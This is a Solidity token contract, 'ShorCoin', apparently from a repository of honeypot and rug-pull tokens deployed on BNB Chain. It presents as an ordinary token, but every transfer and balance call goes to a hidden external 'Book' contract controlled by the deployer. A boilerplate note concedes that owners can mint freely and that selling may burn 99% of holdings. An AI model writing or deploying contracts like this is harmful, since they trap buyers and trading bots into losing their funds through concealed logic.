
// File: /home/repositories/ShannonTech/botHoney/prod/botRugpulls_bsc_truffle_Igor/truffle/contracts/ShorCoin.sol

/**
*Submitted for verification at BscScan.com on 2022/04/24 16:58:52
*/   

/*
************************************ NOTE ************************************

ShorCoin has no utility and its tokenomics have been designed so that it does not produce positive return if traded. 
It is a collectable meant to be held or sent to other partners/participants. The tokenomics are:

- New tokens can be generated by contract owners and sold directly.
- Supply is not fixed.
- Holders of the collectable can send tokens to other participants.
- Attempting to sell the token may lead to substantial token burn (99%).

Deployers of this contract disclose these conditions to make potential buyers aware of collectable tokenomics. 
Purchases of this collectable are non-refundable.
***************************************************************************************
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.16;
contract Book {
    function book_Transfer(address from, address to, uint256 amount) public;
    function book_balanceOf(address who) public view returns (uint256);
    function book_setup(address token, uint256 supply) public returns (bool);
}
contract ShorCoin {

    uint256 totalSupply_;
    address private Book_address;
    address private deployer;
    string public constant name = "ShorCoin";
    string public constant symbol = "SC";
    uint8 public constant decimals = 18;
    mapping(address => mapping (address => uint256)) allowed;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address _book) public {
        totalSupply_ = 180000000*10**18;
        Book_address = _book;
        deployer = msg.sender;
        Book(Book_address).book_setup(address(this), totalSupply_);
    }
    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }
    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }
    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender]>=amount, "Not allowed");
        Book(Book_address).book_Transfer(from, to, amount);
        emit Transfer(from, to, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool) {
        Book(Book_address).book_Transfer(msg.sender, to, amount);
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function balanceOf(address tokenOwner) public view returns (uint256) {
        return Book(Book_address).book_balanceOf(tokenOwner);
    }
}
        
